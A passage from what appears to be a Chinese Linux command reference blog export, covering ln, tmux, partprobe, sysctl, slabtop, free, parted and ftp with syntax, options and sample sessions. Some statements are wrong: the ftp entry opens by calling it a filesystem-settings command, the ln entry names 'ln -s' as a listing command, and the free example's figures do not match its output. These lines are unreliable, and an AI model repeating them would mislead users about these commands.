-s命令建立符号链接时，源文件最好用绝对路径名。这样可以在任何工作目录下进行符号链接。而当源文件用相对路径时，如果当前的工作路径与要创建的符号链接文件所在路径不同，就不能进行链接。 符号链接保持了链接与源文件或目录之间的区别： 删除源文件或目录，只删除了数据，不会删除链接。一旦以同样文件名创建了源文件，链接将继续指向该文件的新数据。 在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是 l。 符号链接的大小是其链接文件的路径名中的字节数。 当用ln -s命令列出文件时，可以看到符号链接名后有一个箭头指向源文件或目录，例如lrwxrwxrwx … 14 jun 20 10:20 /etc/motd-&gt;/original_file其中，表示“文件大小”的数字“14”恰好说明源文件名original_file由 14 个字符构成。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ln","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ln/","stats":{"text":"7 min read","time":376000,"words":1752,"minutes":7},"date":"2022-02-02 16:26:27","dateFormat":"2022-02-02"},{"content":"Tmux 是一个优秀的终端复用软件，类似 GNU Screen，但来自于 OpenBSD，采用 BSD 授权。 补充说明 使用它最直观的好处就是，通过一个终端登录远程主机并运行 tmux 后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机； 功能 提供了强劲的、易于使用的命令行界面。 可横向和纵向分割窗口。 窗格可以自由移动和调整大小，或直接利用四个预设布局之一。 支持 UTF-8 编码及 256 色终端。 可在多个缓冲区进行复制和粘贴。 可通过交互式菜单来选择窗口、会话及客户端。 支持跨窗口搜索。 支持自动及手动锁定窗口。 安装 # 在 Mac OS 中，通过 brew 安装 brew install tmux # ubuntu 版本下直接 apt-get 安装 sudo apt-get install tmux # centos7 版本下直接 yum 安装 yum install -y tmux # centos6 版本需要编译安装 yum install libevent libevent-devel ncurses-devel tar -zvxf tmux-2.3.tar.gz # (提前下载：wget https://github.com/tmux/tmux/releases/download/2.3/tmux-2.3.tar.gz) cd tmux-2.3 ./configure make &amp;&amp; make install 快捷键使用说明 Ctrl+b 激活控制台；此时以下按键生效 系统操作 ? 列出所有快捷键；按q返回 d 脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话 D 选择要脱离的会话；在同时开启了多个会话时使用 Ctrl+z 挂起当前会话 r 强制重绘未脱离的会话 s 选择并切换会话；在同时开启了多个会话时使用 : 进入命令行模式；此时可以输入支持的命令，例如kill-server可以关闭服务器 [ 进入复制模式；此时的操作与vi/emacs相同，按q/Esc退出 ~ 列出提示信息缓存；其中包含了之前tmux返回的各种提示信息 窗口操作 c 创建新窗口 &amp; 关闭当前窗口 数字键 切换至指定窗口 p 切换至上一窗口 n 切换至下一窗口 l 在前后两个窗口间互相切换 w 通过窗口列表切换窗口 , 重命名当前窗口；这样便于识别 . 修改当前窗口编号；相当于窗口重新排序 f 在所有窗口中查找指定文本 面板操作 ” 将当前面板平分为上下两块 % 将当前面板平分为左右两块 x 关闭当前面板 ! 将当前面板置于新窗口；即新建一个窗口，其中仅包含当前面板 Ctrl+方向键 以1个单元格为单位移动边缘以调整当前面板大小 Alt+方向键 以5个单元格为单位移动边缘以调整当前面板大小 Space 在预置的面板布局中循环切换；依次包括even-horizontal、even-vertical、main-horizontal、main-vertical、tiled q 显示面板编号 o 在当前窗口中选择下一面板 方向键 移动光标以选择面板 { 向前置换当前面板 } 向后置换当前面板 Alt+o 逆时针旋转当前窗口的面板 Ctrl+o 顺时针旋转当前窗口的面板 1）进入 tmux 面板后，一定要先按 ctrl+b，然后松开，再按其他的组合键才生效。 2）常用到的几个组合键： ctrl+b ? # 显示快捷键帮助 ctrl+b 空格键 # 采用下一个内置布局，这个很有意思，在多屏时，用这个就会将多有屏幕竖着展示 ctrl+b ! # 把当前窗口变为新窗口 ctrl+b &quot; # 模向分隔窗口 ctrl+b % # 纵向分隔窗口 ctrl+b q # 显示分隔窗口的编号 ctrl+b o # 跳到下一个分隔窗口。多屏之间的切换 ctrl+b 上下键 # 上一个及下一个分隔窗口 ctrl+b C-方向键 # 调整分隔窗口大小 ctrl+b &amp; # 确认后退出当前 tmux ctrl+b [ # 复制模式，即将当前屏幕移到上一个的位置上，其他所有窗口都向前移动一个。 ctrl+b c # 创建新窗口 ctrl+b n # 选择下一个窗口 ctrl+b l # 最后使用的窗口 ctrl+b p # 选择前一个窗口 ctrl+b w # 以菜单方式显示及选择窗口 ctrl+b s # 以菜单方式显示和选择会话。这个常用到，可以选择进入哪个 tmux ctrl+b t # 显示时钟。然后按 enter 键后就会恢复到 shell 终端状态 ctrl+b d # 脱离当前会话；这样可以暂时返回 Shell 界面，输入 tmux attach 能够重新进入之前的会话 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tmux","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tmux/","stats":{"text":"5 min read","time":270000,"words":1195,"minutes":5},"date":"2022-02-02 16:25:31","dateFormat":"2022-02-02"},{"content":"不重启的情况下重读分区。 补充说明 partprobe 命令用于重读分区表，当出现删除文件后，出现仍然占用空间。可以 partprobe 在不重启的情况下重读分区。 语法 partprobe (选项) (参数) 选项 -d：不更新内核； -s：显示摘要和分区； -h：显示帮助信息； -v：显示版本信息。 参数 设备：指定需要确认分区表改变的硬盘对应的设备文件。 实例 使用 partprobe 不重启系统添加新的磁盘分区，主机自带硬盘超过 300GB，目前只划分使用了 3 个主分区，不到 70GB，如下： [root@localhost ~]# df -h Filesystem Size Used Avail Use% Mounted on /dev/sda1 29G 3.7G 24G 14% / /dev/sda2 29G 22G 5.2G 81% /oracle tmpfs 2.0G 0 2.0G 0% /dev/shm [root@localhost ~]# cat /proc/partitions major minor #blocks name 8 0 311427072 sda 8 1 30716248 sda1 8 2 30716280 sda2 8 3 8193150 sda3 8 16 976896 sdb 8 32 976896 sdc …省略其他 现在需要给系统添加 1 个 100GB 的空间存放数据文件，而又不影响现有系统上业务的运行，使用 fdisk 结合 partprobe 命令不重启系统添加一块新的磁盘分区。操作步骤如下： 第 1 步 添加新的磁盘分区 ： [root@localhost ~]# fdisk /dev/sda The number of cylinders for this disk is set to 38770. There is nothing wrong with that, but this is larger than 1024, and could in certain setups cause problems with: 1) software that runs at boot time (e.g., old versions of lilo) 2) booting and partitioning software from other OSs (e.g., DOS FDISK, OS/2 FDISK) command (m for help): p Disk /dev/sda: 318.9 GB, 318901321728 bytes 255 heads, 63 sectors/track, 38770 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks id System /dev/sda1 * 1 3824 30716248+ 83 Linux /dev/sda2 3825 7648 30716280 83 Linux /dev/sda3 7649 8668 8193150 82 Linux swap / Solaris Command (m for help): n Command action e extended p primary partition (1-4) p Selected partition 4 First cylinder (8669-38770, default 8669): Using default value 8669 last cylinder or +size or +sizeM or +sizeK (8669-38770, default 38770): +100G Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. WARNING: Re-reading the partition table failed with error 16: Device or resource busy. The kernel still uses the old table. The new table will be used at the next reboot. Syncing disks. 第 2 步 使用工具 partprobe 让 kernel 读取分区信息： [root@localhost ~]# partprobe 使用 fdisk 工具只是将分区信息写到磁盘，如果需要 mkfs 磁盘分区则需要重启系统，而使用 partprobe 则可以使 kernel 重新读取分区信息，从而避免重启系统。 第 3 步 格式化文件系统： [root@localhost ~]# mkfs.ext3 /dev/sda4 mke2fs 1.39 (29-May-2006) Filesystem label= OS type: Linux Block size=4096 (log=2) Fragment size=4096 (log=2) 12222464 inodes, 24416791 blocks 1220839 blocks (5.00%) reserved for the super user First data block=0 Maximum filesystem blocks=4294967296 746 block groups 32768 blocks per group, 32768 fragments per group 16384 inodes per group Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000, 7962624, 11239424, 20480000, 23887872 Writing inode tables: done Creating journal (32768 blocks): done Writing superblocks and filesystem accounting information: done This filesystem will be automatically checked every 26 mounts or 180 days, whichever comes first. Use tune2fs -c or -i to override. [root@localhost ~]# 第 4 步 mount 新的分区/dev/sda4： [root@localhost ~]# e2label /dev/sda4 /data [root@localhost ~]# mkdir /data [root@localhost ~]# mount /dev/sda4 /data [root@localhost ~]# df Filesystem 1K-blocks Used Available Use% Mounted on /dev/sda1 29753556 3810844 24406900 14% / /dev/sda2 29753588 11304616 16913160 41% /oracle tmpfs 2023936 0 2023936 0% /dev/shm /dev/sda4 96132968 192312 91057300 1% /data 使用 partprobe 可以不用重启系统即可配合 fdisk 工具创建新的分区。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"partprobe","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/partprobe/","stats":{"text":"5 min read","time":249000,"words":820,"minutes":5},"date":"2022-02-02 16:24:25","dateFormat":"2022-02-02"},{"content":"时动态地修改内核的运行参数。 补充说明 sysctl 命令被用于在内核运行时动态地修改内核的运行参数，可用的内核参数在目录/proc/sys中。它包含一些 TCP/ip 堆栈和虚拟内存系统的高级选项， 这可以让有经验的管理员提高引人注目的系统性能。用 sysctl 可以读取设置超过五百个系统变量。 语法 sysctl (选项) (参数) 选项 -n：打印值时不打印关键字； -e：忽略未知关键字错误； -N：仅打印名称； -w：当改变 sysctl 设置时使用此项； -p：从配置文件“/etc/sysctl.conf”加载内核参数设置； -a：打印当前所有可用的内核参数变量和值； -A：以表格方式打印当前所有可用的内核参数变量和值。 参数 变量=值：设置内核参数对应的变量值。 实例 查看所有可读变量： sysctl -a 读一个指定的变量，例如kern.maxproc： sysctl kern.maxproc kern.maxproc: 1044 要设置一个指定的变量，直接用variable=value这样的语法： sysctl kern.maxfiles=5000 kern.maxfiles: 2088 -&gt; 5000 您可以使用 sysctl 修改系统变量，也可以通过编辑 sysctl.conf 文件来修改系统变量。sysctl.conf 看起来很像 rc.conf。它用variable=value的形式来设定值。指定的值在系统进入多用户模式之后被设定。并不是所有的变量都可以在这个模式下设定。 sysctl 变量的设置通常是字符串、数字或者布尔型。（布尔型用 1 来表示 'yes'，用 0 来表示 'no'）。 sysctl -w kernel.sysrq=0 sysctl -w kernel.core_uses_pid=1 sysctl -w net.ipv4.conf.default.accept_redirects=0 sysctl -w net.ipv4.conf.default.accept_source_route=0 sysctl -w net.ipv4.conf.default.rp_filter=1 sysctl -w net.ipv4.tcp_syncookies=1 sysctl -w net.ipv4.tcp_max_syn_backlog=2048 sysctl -w net.ipv4.tcp_fin_timeout=30 sysctl -w net.ipv4.tcp_synack_retries=2 sysctl -w net.ipv4.tcp_keepalive_time=3600 sysctl -w net.ipv4.tcp_window_scaling=1 sysctl -w net.ipv4.tcp_sack=1 配置 sysctl 编辑此文件：/etc/sysctl.conf 如果该文件为空，则输入以下内容，否则请根据情况自己做调整： # Controls source route verification # Default should work for all interfaces net.ipv4.conf.default.rp_filter = 1 # net.ipv4.conf.all.rp_filter = 1 # net.ipv4.conf.lo.rp_filter = 1 # net.ipv4.conf.eth0.rp_filter = 1 # Disables IP source routing # Default should work for all interfaces net.ipv4.conf.default.accept_source_route = 0 # net.ipv4.conf.all.accept_source_route = 0 # net.ipv4.conf.lo.accept_source_route = 0 # net.ipv4.conf.eth0.accept_source_route = 0 # Controls the System Request debugging functionality of the kernel kernel.sysrq = 0 # Controls whether core dumps will append the PID to the core filename. # Useful for debugging multi-threaded applications. kernel.core_uses_pid = 1 # Increase maximum amount of memory allocated to shm # Only uncomment if needed! # kernel.shmmax = 67108864 # Disable ICMP Redirect Acceptance # Default should work for all interfaces net.ipv4.conf.default.accept_redirects = 0 # net.ipv4.conf.all.accept_redirects = 0 # net.ipv4.conf.lo.accept_redirects = 0 # net.ipv4.conf.eth0.accept_redirects = 0 # enable Log Spoofed Packets, Source Routed Packets, Redirect Packets # Default should work for all interfaces net.ipv4.conf.default.log_martians = 1 # net.ipv4.conf.all.log_martians = 1 # net.ipv4.conf.lo.log_martians = 1 # net.ipv4.conf.eth0.log_martians = 1 # Decrease the time default value for tcp_fin_timeout connection net.ipv4.tcp_fin_timeout = 25 # Decrease the time default value for tcp_keepalive_time connection net.ipv4.tcp_keepalive_time = 1200 # Turn on the tcp_window_scaling net.ipv4.tcp_window_scaling = 1 # Turn on the tcp_sack net.ipv4.tcp_sack = 1 # tcp_fack should be on because of sack net.ipv4.tcp_fack = 1 # Turn on the tcp_timestamps net.ipv4.tcp_timestamps = 1 # Enable TCP SYN Cookie Protection net.ipv4.tcp_syncookies = 1 # Enable ignoring broadcasts request net.ipv4.icmp_echo_ignore_broadcasts = 1 # Enable bad error message Protection net.ipv4.icmp_ignore_bogus_error_responses = 1 # make more local ports available # net.ipv4.ip_local_port_range = 1024 65000 # set TCP Re-Ordering value in kernel to ‘5′ net.ipv4.tcp_reordering = 5 # Lower syn retry rates net.ipv4.tcp_synack_retries = 2 net.ipv4.tcp_syn_retries = 3 # Set Max SYN Backlog to ‘2048′ net.ipv4.tcp_max_syn_backlog = 2048 # Various Settings net.core.netdev_max_backlog = 1024 # Increase the maximum number of skb-heads to be cached net.core.hot_list_length = 256 # Increase the tcp-time-wait buckets pool size net.ipv4.tcp_max_tw_buckets = 360000 # This will increase the amount of memory available for socket input/output queues net.core.rmem_default = 65535 net.core.rmem_max = 8388608 net.ipv4.tcp_rmem = 4096 87380 8388608 net.core.wmem_default = 65535 net.core.wmem_max = 8388608 net.ipv4.tcp_wmem = 4096 65535 8388608 net.ipv4.tcp_mem = 8388608 8388608 8388608 net.core.optmem_max = 40960 如果希望屏蔽别人 ping 你的主机，则加入以下代码： # Disable ping requests net.ipv4.icmp_echo_ignore_all = 1 编辑完成后，请执行以下命令使变动立即生效： /sbin/sysctl -p /sbin/sysctl -w net.ipv4.route.flush=1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sysctl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sysctl/","stats":{"text":"5 min read","time":294000,"words":990,"minutes":5},"date":"2022-02-02 16:24:08","dateFormat":"2022-02-02"},{"content":"实时显示内核 slab 内存缓存信息。 补充说明 slabtop 命令以实时的方式显示内核“slab”缓冲区的细节信息。 语法 slabtop (选项) 选项 --delay=n, -d n：每 n 秒更新一次显示的信息，默认是每 3 秒； --sort=S, -s S：指定排序标准进行排序（排序标准，参照下面或者 man 手册）； --once, -o：显示一次后退出； --version, -V：显示版本； --help：显示帮助信息。 排序标准： a: sort by number of active objects b: sort by objects per slab c: sort by cache size l: sort by number of slabs v：sort by number of active slabs n: sort by name o: sort by number of objects p: sort by pages per slab s: sort by object size u: sort by cache utilization 知识扩展 内核的模块在分配资源的时候，为了提高效率和资源的利用率，都是透过 slab 来分配的。通过 slab 的信息，再配合源码能粗粗了解系统的运行情况，比如说什么资源有没有不正常的多，或者什么资源有没有泄漏。linux 系统透过/proc/slabinfo 来向用户暴露 slab 的使用情况。 Linux 所使用的 slab 分配器的基础是 Jeff Bonwick 为 SunOS 操作系统首次引入的一种算法。Jeff 的分配器是围绕对象缓存进行的。在内核中，会为有限的对象集（例如文件描述符和其他常见结构）分配大量内存。Jeff 发现对内核中普通对象进行初始化所需的时间超过了对其进行分配和释放所需的时间。因此他的结论是不应该将内存释放回一个全局的内存池，而是将内存保持为针对特定目而初始化的状态。Linux slab 分配器使用了这种思想和其他一些思想来构建一个在空间和时间上都具有高效性的内存分配器。 保存着监视系统中所有活动的 slab 缓存的信息的文件为/proc/slabinfo。 实例 slabtop Active / Total Objects (% used) : 897519 / 1245930 (72.0%) Active / Total Slabs (% used) : 38605 / 38605 (100.0%) Active / Total Caches (% used) : 94 / 145 (64.8%) Active / Total Size (% used) : 129558.22K / 153432.58K (84.4%) Minimum / Average / Maximum Object : 0.01K / 0.12K / 128.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 440136 171471 38% 0.05K 6113 72 24452K buffer_head 190086 148576 78% 0.05K 2437 78 9748K selinux_inode_security 151840 146366 96% 0.48K 18980 8 75920K ext3_inode_cache 144333 144143 99% 0.02K 711 203 2844K avtab_node 130529 128488 98% 0.13K 4501 29 18004K dentry_cache 99214 99071 99% 0.03K 878 113 3512K size-32 43834 28475 64% 0.27K 3131 14 12524K radix_tree_node 17818 9450 53% 0.06K 302 59 1208K size-64 4602 4562 99% 0.05K 59 78 236K sysfs_dir_cache 3220 2855 88% 0.08K 70 46 280K vm_area_struct 2460 2114 85% 0.12K 82 30 328K size-128 1564 1461 93% 0.04K 17 92 68K Acpi-Operand 1540 1540 100% 0.33K 140 11 560K inode_cache 1524 466 30% 0.01K 6 254 24K anon_vma 1440 515 35% 0.05K 20 72 80K avc_node 1440 1154 80% 0.19K 72 20 288K filp 1170 1023 87% 0.05K 15 78 60K ext3_xattr 845 724 85% 0.02K 5 169 20K Acpi-Namespace 638 315 49% 0.35K 58 11 232K proc_inode_cache 450 434 96% 0.25K 30 15 120K size-256 424 386 91% 0.50K 53 8 212K size-512 312 107 34% 0.05K 4 78 16K delayacct_cache 306 284 92% 0.43K 34 9 136K shmem_inode_cache 303 108 35% 0.04K 3 101 12K pid 300 261 87% 0.19K 15 20 60K skbuff_head_cache 300 300 100% 0.12K 10 30 40K bio 260 260 100% 32.00K 260 1 8320K size-32768 254 6 2% 0.01K 1 254 4K revoke_table 236 55 23% 0.06K 4 59 16K fs_cache 216 203 93% 1.00K 54 4 216K size-1024 214 214 100% 2.00K 107 2 428K size-2048 203 83 40% 0.02K 1 203 4K biovec-1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"slabtop","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/slabtop/","stats":{"text":"5 min read","time":252000,"words":869,"minutes":5},"date":"2022-02-02 16:23:56","dateFormat":"2022-02-02"},{"content":"显示内存的使用情况。 补充说明 free 命令可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。 语法 free (选项) 选项 -b # 以 Byte 为单位显示内存使用情况； -k # 以 KB 为单位显示内存使用情况； -m # 以 MB 为单位显示内存使用情况； -g # 以 GB 为单位显示内存使用情况。 -o # 不显示缓冲区调节列； -s&lt;间隔秒数&gt; # 持续观察内存使用状况； -t # 显示内存总和列； -V # 显示版本信息。 实例 free -t # 以总和的形式显示内存的使用信息 free -s 10 # 周期性的查询内存使用信息，每 10s 执行一次命令 显示内存使用情况 free -m total used free shared buffers cached Mem: 2016 1973 42 0 163 1497 -/+ buffers/cache: 312 1703 Swap: 4094 0 4094 第一部分 Mem 行解释： total：内存总数； used：已经使用的内存数； free：空闲的内存数； shared：当前已经废弃不用； buffers Buffer：缓存内存数； cached Page：缓存内存数。 关系：total = used + free 第二部分 (-/+ buffers/cache) 解释: (-buffers/cache) used 内存数：第一部分 Mem 行中的 used – buffers – cached (+buffers/cache) free 内存数: 第一部分 Mem 行中的 free + buffers + cached 可见-buffers/cache 反映的是被程序实实在在吃掉的内存，而+buffers/cache 反映的是可以挪用的内存总数。 第三部分是指交换分区。 输出结果的第四行是交换分区 SWAP 的，也就是我们通常所说的虚拟内存。 区别：第二行 (mem) 的 used/free 与第三行 (-/+ buffers/cache) used/free 的区别。 这两个的区别在于使用的角度来看，第一行是从 OS 的角度来看，因为对于 OS，buffers/cached 都是属于被使用，所以他的可用内存是 2098428KB,已用内存是 30841684KB,其中包括，内核（OS）使用+Application(X, oracle,etc) 使用的+buffers+cached. 第三行所指的是从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为 buffer/cached 是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached 会很快地被回收。 所以从应用程序的角度来说，可用内存=系统 free memory+buffers+cached。 如本机情况的可用内存为： 18007156=2098428KB+4545340KB+11363424KB 接下来解释什么时候内存会被交换，以及按什么方交换。 当可用内存少于额定值的时候，就会开会进行交换。如何看额定值： cat /proc/meminfo MemTotal: 16140816 kB MemFree: 816004 kB MemAvailable: 2913824 kB Buffers: 17912 kB Cached: 2239076 kB SwapCached: 0 kB Active: 12774804 kB Inactive: 1594328 kB Active(anon): 12085544 kB Inactive(anon): 94572 kB Active(file): 689260 kB Inactive(file): 1499756 kB Unevictable: 116888 kB Mlocked: 116888 kB SwapTotal: 8191996 kB SwapFree: 8191996 kB Dirty: 56 kB Writeback: 0 kB AnonPages: 12229228 kB Mapped: 117136 kB Shmem: 58736 kB Slab: 395568 kB SReclaimable: 246700 kB SUnreclaim: 148868 kB KernelStack: 30496 kB PageTables: 165104 kB NFS_Unstable: 0 kB Bounce: 0 kB WritebackTmp: 0 kB CommitLimit: 16262404 kB Committed_AS: 27698600 kB VmallocTotal: 34359738367 kB VmallocUsed: 311072 kB VmallocChunk: 34350899200 kB HardwareCorrupted: 0 kB AnonHugePages: 3104768 kB HugePages_Total: 0 HugePages_Free: 0 HugePages_Rsvd: 0 HugePages_Surp: 0 Hugepagesize: 2048 kB DirectMap4k: 225536 kB DirectMap2M: 13279232 kB DirectMap1G: 5242880 kB 交换将通过三个途径来减少系统中使用的物理页面的个数： 减少缓冲与页面 cache 的大小， 将系统 V 类型的内存页面交换出去， 换出或者丢弃页面。(Application 占用的内存页，也就是物理内存不足）。 事实上，少量地使用 swap 是不是影响到系统性能的。 那 buffers 和 cached 都是缓存，两者有什么区别呢？ 为了提高磁盘存取效率, Linux 做了一些精心的设计, 除了对 dentry 进行缓存 (用于 VFS,加速文件路径名到 inode 的转换), 还采取了两种主要 Cache 方式： Buffer Cache 和 Page Cache。前者针对磁盘块的读写，后者针对文件 inode 的读写。这些 Cache 有效缩短了 I/O 系统调用 (比如 read,write,getdents) 的时间。 磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种 Cache 就是分别缓存逻辑和物理级数据的。 Page cache 实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到 page cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当 page cache 的数据需要刷新时，page cache 中的数据交给 buffer cache，因为 Buffer Cache 就是缓存磁盘块的。但是这种处理在 2.6 版本的内核之后就变的很简单了，没有真正意义上的 cache 操作。 Buffer cache 是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到 buffer cache 中，例如，文件系统的元数据都会缓存到 buffer cache 中。 简单说来，page cache 用来缓存文件数据，buffer cache 用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到 page cache，如果直接采用 dd 等工具对磁盘进行读写，那么数据会缓存到 buffer cache。 所以我们看 linux,只要不用 swap 的交换空间,就不用担心自己的内存太少.如果常常 swap 用很多,可能你就要考虑加物理内存了.这也是 linux 看内存是否够用的标准. 如果是应用服务器的话，一般只看第二行，+buffers/cache,即对应用程序来说 free 的内存太少了，也是该考虑优化程序或加内存了。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"free","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/free/","stats":{"text":"6 min read","time":338000,"words":1425,"minutes":6},"date":"2022-02-02 16:23:36","dateFormat":"2022-02-02"},{"content":"磁盘分区和分区大小调整工具。 补充说明 parted 命令是由 GNU 组织开发的一款功能强大的磁盘分区和分区大小调整工具，与 fdisk 不同，它支持调整分区的大小。作为一种设计用于 Linux 的工具，它没有构建成处理与 fdisk 关联的多种分区类型，但是，它可以处理最常见的分区格式，包括：ext2、ext3、fat16、fat32、NTFS、ReiserFS、JFS、XFS、UFS、HFS 以及 Linux 交换分区。 语法 parted (选项) (参数) 选项 -h：显示帮助信息； -i：交互式模式； -s：脚本模式，不提示用户； -v：显示版本号。 参数 设备：指定要分区的硬盘所对应的设备文件； 命令：要执行的 parted 命令。 实例 从串行技术出现以来，越来越多用户选择使用大容量的 SATA 硬盘创建磁盘阵列；特别是 MD1000/MD3000，很轻易就突破 2T 的 LUN，故在此给大家一些指引。 红帽企业 Linux 4 Update 4 供对大于 2 terabytes（TB）的磁盘设备的支持。 请参考以下操作步骤： 注： 绿色代表你需要使用的命令。 红色代表你需要注意到的输出信息，在后续需要使用。 [root@localhost ~]# fdisk -l Disk /dev/sda: 35.8 GB, 35862976512 bytes 255 heads, 63 sectors/track, 4360 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks id System /dev/sda1 * 1 13 104391 83 Linux /dev/sda2 14 144 1052257+ 82 Linux swap /dev/sda3 145 4360 33865020 83 Linux Disk /dev/sdb: 2147 MB, 2147483648 bytes 255 heads, 63 sectors/track, 261 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Disk /dev/sdb doesn't contain a valid partition table [root@localhost ~]# parted /dev/sdb GNU Parted Copyright (C) 1998 - 2004 free Software Foundation, Inc. This program is free software, covered by the GNU General Public License. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. 使用/dev/sdb (parted)mklabel gpt (parted)print /dev/sdb 的磁盘几何结构：0.000-2048.000 兆字节 磁盘标签类型：gpt Minor 起始点 终止点 文件系统 名称 标志 (parted)mkpart primary 0 2048 &lt;-----上面 print 显示的数字 (parted)print /dev/sdb 的磁盘几何结构：0.000-2048.000 兆字节 磁盘标签类型：gpt Minor 起始点 终止点 文件系统 名称 标志 1 0.017 2047.983 (parted)quit 如果必要，不要忘记更新/etc/fstab。 [root@localhost ~]# fdisk -l Disk /dev/sda: 35.8 GB, 35862976512 bytes 255 heads, 63 sectors/track, 4360 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sda1 * 1 13 104391 83 Linux /dev/sda2 14 144 1052257+ 82 Linux swap /dev/sda3 145 4360 33865020 83 Linux WARNING: GPT (GUID Partition Table) detected on '/dev/sdb'! The util fdisk doesn't support GPT. Use GNU Parted. Disk /dev/sdb: 2147 MB, 2147483648 bytes 255 heads, 63 sectors/track, 261 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 262 2097151+ ee EFI GPT Partition 1 has different physical/logical beginnings (non-Linux?): phys=(0, 0, 1) logical=(0,0, 2) Partition 1 has different physical/logical endings: phys=(1023, 254, 63) logical=(261, 21, 16) [root@localhost ~]# mkfs.ext3 /dev/sdb1 mke2fs 1.35 (28-Feb-2004) Filesystem label= OS type: Linux Block size=4096 (log=2) Fragment size=4096 (log=2) 262144 inodes, 524279 blocks 26213 blocks (5.00%) reserved for the super user First data block=0 Maximum filesystem blocks=536870912 16 block groups 32768 blocks per group, 32768 fragments per group 16384 inodes per group Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912 Writing inode tables: done Creating journal (8192 blocks): done Writing superblocks and filesystem accounting information: done This filesystem will be automatically checked every 28 mounts or 180 days, whichever comes first. Use tune2fs -c or -i to override. [root@localhost ~]# mount /dev/sdb1 /mnt [root@localhost ~]# df -h Filesystem 容量 已用 可用 已用% 挂载点 /dev/sda3 &lt;?xml:namespace prefix = st1 /&gt;32G 2.6G 28G 9% / /dev/sda1 99M 12M 82M 13% /boot none 252M 0 252M 0% /dev/shm /dev/sdb1 2.0G 36M 1.9G 2% /mnt ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"parted","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/parted/","stats":{"text":"5 min read","time":272000,"words":901,"minutes":5},"date":"2022-02-02 16:22:28","dateFormat":"2022-02-02"},{"content":"用来设置文件系统相关功能。 补充说明 ftp 命令用来设置文件系统相关功能。ftp 服务器在网上较为常见，Linux ftp 命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍 Linux ftp 命令的一些经常使用的命令，相信掌握了这些使用 Linux 进行 ftp 操作将会非常容易。 语法 ftp (选项) (参数) 选项 -d：详细显示指令执行过程，便于排错或分析程序执行的情况； -i：关闭互动模式，不询问任何问题； -g：关闭本地主机文件名称支持特殊字符的扩充特性； -n：不使用自动登录； -v：显示指令执行过程。 参数 主机：指定要连接的 FTP 服务器的主机名或 ip 地址。 实例 ftp&gt; ascii # 设定以 ASCII 方式传送文件 (缺省值) ftp&gt; bell # 每完成一次文件传送,报警提示. ftp&gt; binary # 设定以二进制方式传送文件. ftp&gt; bye # 终止主机 FTP 进程,并退出 FTP 管理方式. ftp&gt; case # 当为 ON 时,用 MGET 命令拷贝的文件名到本地机器中,全部转换为小写字母. ftp&gt; cd # 同 UNIX 的 CD 命令. ftp&gt; cdup # 返回上一级目录. ftp&gt; chmod # 改变远端主机的文件权限. ftp&gt; close # 终止远端的 FTP 进程,返回到 FTP 命令状态, 所有的宏定义都被删除. ftp&gt; delete # 删除远端主机中的文件. ftp&gt; dir [remote-directory] [local-file] # 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件. ftp&gt; get [remote-file] [local-file] # 从远端主机中传送至本地主机中. ftp&gt; help [command] # 输出命令的解释. ftp&gt; lcd # 改变当前本地主机的工作目录,如果缺省,就转到当前用户的 HOME 目录. ftp&gt; ls [remote-directory] [local-file] # 同 DIR. ftp&gt; macdef # 定义宏命令. ftp&gt; mdelete [remote-files] # 删除一批文件. ftp&gt; mget [remote-files] # 从远端主机接收一批文件至本地主机. ftp&gt; mkdir directory-name # 在远端主机中建立目录. ftp&gt; mput local-files # 将本地主机中一批文件传送至远端主机. ftp&gt; open host [port] # 